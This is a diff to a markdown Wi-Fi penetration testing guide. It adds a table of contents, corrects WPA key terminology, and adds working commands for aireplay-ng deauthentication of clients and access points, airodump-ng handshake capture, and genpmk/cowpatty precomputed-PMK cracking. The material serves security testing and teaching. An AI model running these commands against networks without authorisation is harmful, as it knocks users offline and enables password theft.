@@ -1,5 +1,93 @@
 # Wireless Penetration Testing
 
+- [Wireless Penetration Testing](#wireless-penetration-testing)
+  - [Frequency / bands / Channels](#frequency--bands--channels)
+      - [Overlapping channels for 2.4 GHz](#overlapping-channels-for-24-ghz)
+      - [Non Overlapping channels for 2.4 GHz (to avoid interferences) with channel bonding](#non-overlapping-channels-for-24-ghz-to-avoid-interferences-with-channel-bonding)
+      - [Signal and attenuation 2.4GHz VS 5GHz](#signal-and-attenuation-24ghz-vs-5ghz)
+      - [Antennas](#antennas)
+  - [WLAN basics](#wlan-basics)
+    - [Frames](#frames)
+      - [Management Frames](#management-frames)
+      - [Control Frames](#control-frames)
+      - [Data Frames](#data-frames)
+    - [Authentication Types](#authentication-types)
+      - [Open Authentication](#open-authentication)
+      - [Personal Authentication](#personal-authentication)
+      - [Enterprise Authentication](#enterprise-authentication)
+  - [Installation / Configuration](#installation--configuration)
+  - [Debug and Wi-Fi ninja](#debug-and-wi-fi-ninja)
+      - [Check Wi-Fi card frequency and channel available](#check-wi-fi-card-frequency-and-channel-available)
+    - [Restart networking service and WPA supplicant](#restart-networking-service-and-wpa-supplicant)
+    - [Changing Wi-Fi card channel](#changing-wi-fi-card-channel)
+    - [Changing Wi-Fi card Frequency](#changing-wi-fi-card-frequency)
+    - [Monitor mode](#monitor-mode)
+    - [Connect using wpa-supplicant](#connect-using-wpa-supplicant)
+  - [Recon](#recon)
+  - [Hidden SSID](#hidden-ssid)
+      - [With Connected Clients](#with-connected-clients)
+      - [Without Connected Clients](#without-connected-clients)
+  - [Passive Sniffing](#passive-sniffing)
+  - [Preferred Network List (PNL)](#preferred-network-list-pnl)
+  - [Open Network](#open-network)
+  - [Beacon flood attack](#beacon-flood-attack)
+  - [Deauthentication attack](#deauthentication-attack)
+  - [WPS Pin](#wps-pin)
+  - [Guest Network](#guest-network)
+      - [Guest network without password](#guest-network-without-password)
+      - [MAC based authentication (Captive Portal Bypass)](#mac-based-authentication-captive-portal-bypass)
+      - [Network Isolation](#network-isolation)
+      - [Client isolation/separation](#client-isolationseparation)
+      - [Azure AD and conditional Access Policy](#azure-ad-and-conditional-access-policy)
+      - [Guest Public IP VS Corporate Public IP](#guest-public-ip-vs-corporate-public-ip)
+      - [Fake access point with internet access](#fake-access-point-with-internet-access)
+  - [WEP](#wep)
+        - [Connecting using wpa_supplicant](#connecting-using-wpa_supplicant)
+        - [Crack WEP](#crack-wep)
+        - [Decrypt traffic](#decrypt-traffic)
+  - [WPA / WPA2](#wpa--wpa2)
+      - [TKIP - Temporary Key Integrity Protocol](#tkip---temporary-key-integrity-protocol)
+      - [4 way handhsake and encryption keys](#4-way-handhsake-and-encryption-keys)
+    - [WPA2-PSK](#wpa2-psk)
+      - [WPA2-Deauthentication attack (against client)](#wpa2-deauthentication-attack-against-client)
+      - [WPA2-Deauthentication attack (against AP)](#wpa2-deauthentication-attack-against-ap)
+      - [Cracking WPA2 handshake](#cracking-wpa2-handshake)
+        - [Dictionnary attack](#dictionnary-attack)
+        - [Pre Computed PMK](#pre-computed-pmk)
+      - [KARMA Attack](#karma-attack)
+      - [PMKID](#pmkid)
+      - [KRACK Attack](#krack-attack)
+      - [FRAG Attack](#frag-attack)
+    - [WPA2-EAP (Enterprise)](#wpa2-eap-enterprise)
+      - [WPA2-EAP - Password spray attack](#wpa2-eap---password-spray-attack)
+  - [WPA3](#wpa3)
+      - [ZKP - Zero Knowledge Proof](#zkp---zero-knowledge-proof)
+    - [Use WPA3-SAE authentication on Linux](#use-wpa3-sae-authentication-on-linux)
+    - [WPA3-SAE](#wpa3-sae)
+      - [DragonSlayer](#dragonslayer)
+      - [ATTACK : WPA2 Downgrade](#attack--wpa2-downgrade)
+      - [](#)
+      - [ATTACK : WPA3-Transition Downgrade](#attack--wpa3-transition-downgrade)
+      - [ATTACK : WPA3-SAE timing or cache password paritioning](#attack--wpa3-sae-timing-or-cache-password-paritioning)
+      - [Dragonblood toolset](#dragonblood-toolset)
+    - [WPA3-EAP](#wpa3-eap)
+  - [Wi-Fi Hacking Mind Map](#wi-fi-hacking-mind-map)
+  - [Other Attacks](#other-attacks)
+      - [Fake Captive Portal](#fake-captive-portal)
+      - [Fake Open Access Point](#fake-open-access-point)
+  - [Resources](#resources)
+      - [WEP Cloaking](#wep-cloaking)
+      - [4-Way Handshake](#4-way-handshake)
+      - [PTK Derivation](#ptk-derivation)
+      - [Pi-PwnBox Rogue AP](#pi-pwnbox-rogue-ap)
+      - [OpenWRT supported devices](#openwrt-supported-devices)
+      - [OpenWRT Compatibles routers](#openwrt-compatibles-routers)
+      - [SSID Oracle Attack on Undisclosed Wi-Fi Preferred Network Lists](#ssid-oracle-attack-on-undisclosed-wi-fi-preferred-network-lists)
+      - [Dragonblood: Analyzing the Dragonfly Handshake of WPA3 and EAP-pwd](#dragonblood-analyzing-the-dragonfly-handshake-of-wpa3-and-eap-pwd)
+  - [Tools](#tools)
+  - [Vulnerabilities for WLANs Networks](#vulnerabilities-for-wlans-networks)
+  - [Defenses](#defenses)
+
 ## Frequency / bands / Channels
 - 2.4 GHz : 11 Channels (14 total, e.g: In Japan)
   - 2.4 GHz = 802.11 b / g / n / ax
@@ -323,7 +411,9 @@ Sometimes it is possible to bypass conditonal access policy for example regardin
 This represents a vulnerability and could give to an attacker the ability to get a first foothold.
 
 #### Guest Public IP VS Corporate Public IP
-It is important to have a different exit public IP address for any guest regarding the internal network IP.
+It is important to have a different exit public IP address for any guest regarding the internal network IP.  
+
+--> Validate the public IP address from any guest network and internal network is different.  
 
 #### Fake access point with internet access
 
@@ -390,7 +480,7 @@ Once the key is retrieve attacker can decrypt traffic for other devices.
 - PassPhrase (password)
 - PSK (Pre shared key)
 - PMK (Pairwise Master Key)
-- PTK (Pairwise Transit Key)
+- PTK (Pairwise Transient Key)
 - GTK (Group Temporal Key)
 - GMK (Group Master Key)
 
@@ -402,13 +492,19 @@ WPA/WPA2 use **PBKDF2** (Password Based Key Derivation Function).
 --> 4096 = Number of iterations or times the passphrase is hashed  
 --> 256 = Intended Key Length of PSK in bits 
 
-*PTK* = Function(PMK, ANonce, SNonce, Authenticator MAC, Supplicant MAC)  
+*PTK* = PRF(PMK, ANonce, SNonce, Authenticator MAC, Supplicant MAC)  
 - PMK - Pairwise Master Key
 - ANonce - Random string generated by Access Point (AP)
 - SNonce - Random string generated by client/station (STA)
 - Authentication MAC - Access Point  MAC
 - Supplicantg MAC - Client/station MAC
---> PTK is 
+
+--> PRF is a pseudo-random function which is applied to all the input  
+--> *PTK is separate for every user*
+
+*GTK* = Generated by Access Point and sent to client.  
+- Same for all clients Connected to a BSSID
+- USed for broadcast, multicast messages
 
 <img src="./images/keys2.png" width="500"/>
 
@@ -417,14 +513,54 @@ WPA/WPA2 use **PBKDF2** (Password Based Key Derivation Function).
 <img src="./images/keys.png" width="500"/>
 
 ### WPA2-PSK
-#### WPA2-PSK (Deauth + Capture handshake + Crack It)
 One of the most known technic to attack WPA2-PSK (Pre Shared Key) is to deauthenticate clients and capture authentication handshake to further brute force it and try to recover clear text password.
 
-##### WPA2-Deauthentication attack (against client)
+<img src="./images/wpa2_attack.png" width="500"/>
 
-##### WPA2-Deauthentication attack (against AP)
+#### WPA2-Deauthentication attack (against client) 
 
-##### Capture WPA2 Handshake
+```
+sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan1
+sudo aireplay-ng --deauth 10 -a 00:14:6C:7E:40:80 -c 00:0F:B5:AE:CE:9D wlan1
+```
+
+#### WPA2-Deauthentication attack (against AP)
+If the ```–c``` (CLIENT_MAC) parameter is not specified when you run your deauth attack with aireplay-ng, all clients connected to the AP will be disconnected via deauthentication broadcast packet, but it is more effective to target a client individually.  
+
+```
+sudo aireplay-ng --deauth 10 -a <BSSID> wlan1
+sudo aireplay-ng --deauth 10 -a 00:14:6C:7E:40:80 wlan1
+```
+
+#####Capture WPA2 Handshake
+In order to attack and crack WPA2 handshake you do not need to get full 4 way handshake. (Filter in Wireshark: *eapol*)  
+--> Airodump-ng will inform you when you capture a valid handshake.  
+
+You will need the minimal following packets/message from 4 way handshake:
+- ANonce (Message 1 and Message 3)
+- SNonce (Message 2)
+
+1. Packet 1 and 2
+2. Packet 2 and 3
+
+```
+sudo airodump-ng wlan1 -c 11 --bssid 00:1C:10:00:00:00 -w ./capturePSK
+```
+
+#### Cracking WPA2 handshake
+##### Dictionnary attack
+
+
+##### Pre Computed PMK
+Pre computed PMK (Because PBKDF2 function is time consuming to proceed). You will still need to capture 4 Way handshake for SNonce, ANonce, AP MAC and Client MAC.
+  - Require SSID and Passphrase (dictionnary)
+
+```
+genpmk -f wordlistPassphrase.txt -s CorpoWifi -d precomputed_PMK
+cowpatty -d precomputed_PMK -s CorpoWifi -f wordlistPassphrase.txt
+```
+
+<img src="./images/pre_computed.png" width="500"/>
 
 #### KARMA Attack
 
@@ -563,8 +699,16 @@ The main goal is to create an interesting enough SSID in order for a victim to c
 
 - https://sarwiki.informatik.hu-berlin.de/WPA3_Dragonfly_Handshake#:~:text=The%20major%20improvement%20of%20WPA3,traffic%20after%20a%20key%20breach.
 
+#### WEP Cloaking
+- https://media.defcon.org/DEF%20CON%2015/DEF%20CON%2015%20presentations/DEF%20CON%2015%20-%20gupta_and_ramachandran-WP.pdf
+
 #### 4-Way Handshake
 - https://www.wifi-professionals.com/2019/01/4-way-handshake
+
+#### PTK Derivation
+- https://crypto.stackexchange.com/questions/47003/how-pairwise-transient-key-is-derived-or-generated
+- https://en.wikipedia.org/wiki/Pseudorandom_function_family
+- https://dalewifisec.wordpress.com/tag/ptk/
 
 #### Pi-PwnBox Rogue AP
 - https://github.com/koutto/pi-pwnbox-rogueap
